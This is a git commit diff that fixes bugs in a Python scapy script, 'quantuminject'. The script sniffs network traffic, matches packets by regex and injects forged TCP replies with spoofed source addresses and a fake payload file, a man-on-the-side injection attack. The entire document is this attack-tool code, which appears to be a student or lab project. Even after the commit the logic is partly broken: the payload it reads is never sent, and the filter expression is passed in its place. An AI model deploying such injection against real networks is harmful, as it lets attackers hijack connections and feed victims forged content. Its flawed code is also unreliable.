e021df16ef61e93d72fed8bd8c125cd44d0a152b
root <root@localhost.localdomain>
2018-05-22 09:45:16 -0400

    Working with error

--- src/inject/inject.py
+++ src/inject/inject.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 import argparse
 import re
-import scapy
+from scapy.all import *
 import signal
 import sys
 
@@ -10,12 +10,12 @@ def safe_close(signal, frame):
         print('User requested to close ')
         sys.exit(0)
 
-signal.signal(signal.SIGINT, signal_handler)
+signal.signal(signal.SIGINT, safe_close)
 
 def inject_main(interface, regexp, datafile, exp):
 	response_file = open(args.datafile,'r')
 	response = response_file.read()
-	response.close()
+	response_file.close()
 	regex_engine = re.compile(regexp)
 	sniff(
 		iface=interface,
@@ -23,7 +23,7 @@ def inject_main(interface, regexp, datafile, exp):
 		prn=lambda packet: _process_packet(packet, regex_engine, exp)
 		)
 
-def _process_packet(packet, regexp, response):
+def _process_packet(packet, regex_engine, response):
 	if(_is_target_packet(packet, regex_engine)):
 		_inject_reply(packet, response)
 
@@ -32,23 +32,19 @@ def _is_target_packet(packet, regex_engine):
 	return re.search(regex_engine, packet[TCP][Raw].load)
 
 def _inject_reply(packet, response_payload):
-	loaded_response =  
-	Ether(
+	loaded_response =  Ether(
 		src		=	packet[IP].dst,
 		dst 	=	packet[IP].src
-		)
-	/ IP(
+		) / IP(
 		src 	=	packet[IP].dst,
 		dst 	=	packet[IP].src,
 		id 		=	packet[IP].id + 42
-		) 
-	/ TCP(
+		) / TCP(
 		sport	=	packet[TCP].dport,
 		dport	=	packet[TCP].sport,
-		ack 	= 	packet[TCP].seq + len(packet[Raw]),
+		ack 	= 	packet[TCP].seq + len(packet[TCP][Raw].load),
 		seq 	= 	packet[TCP].ack,
-		) 
-	/ response_payload
+		) / response_payload
 
 	sendp(loaded_response)
 
@@ -57,17 +53,14 @@ def _inject_reply(packet, response_payload):
 
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
-	"""
-	quantuminject [­i interface] [­r regexp] [­d datafile] expression
-	"""
 	parser.add_argument("-i", "--interface", default="eth0",
 		help="Target Network interface to intercept traffic")
-	parser.add_argument("-r", "--regexp",
+	parser.add_argument("-r", "--regexp", default=".*",
 		help="A regular expression to filter out packets")
-	parser.add_argument("-d", "--datafile", 
+	parser.add_argument("-d", "--datafile", default="data/examples/payload.data",
 		help="The fake payload to be injected as response")
-	parser.add_argument("exp", default="tcp and port 80", 
+	parser.add_argument("-e", "--expression", default="tcp and port 80", 
 		help="A berkeley packet filter describing the packets to be captured")
 	#Parse the command line arguments
 	args = parser.parse_args()
-	inject_main(args.interface, args.regexp, args.datafile, args.exp)
+	inject_main(args.interface, args.regexp, args.datafile, args.expression)
